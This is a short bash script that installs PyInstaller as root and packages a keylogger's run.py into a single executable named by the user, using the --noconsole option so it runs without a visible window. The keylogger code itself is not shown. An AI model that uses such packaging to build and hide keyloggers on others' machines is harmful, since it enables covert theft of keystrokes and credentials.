#!/usr/bin/env bash
################################################

# Ensure the script is run with appropriate permissions
if [[ "$EUID" -ne 0 ]]; then
    echo "Please run as root or use sudo to install packages."
    exit 1
fi

# Install pyinstaller with verbose output
echo "Installing pyinstaller..."
pip3 install pyinstaller -v

# Check if the installation was successful
if [[ $? -ne 0 ]]; then
    echo "Failed to install pyinstaller. Exiting."
    exit 1
fi

# Prompt the user for the name of the Keylogger
read -p "Enter the name you want for your Keylogger: " name

# Validate the user input
if [[ -z "$name" ]]; then
    echo "No name provided. Exiting."
    exit 1
fi

# Create the executable with PyInstaller
echo "Creating executable with PyInstaller..."
pyinstaller --onefile --name "$name" --noconsole run.py

# Check if PyInstaller was successful
if [[ $? -eq 0 ]]; then
    echo "Executable created successfully."
else
    echo "Failed to create executable. Please check the PyInstaller output for errors."
    exit 1
fi
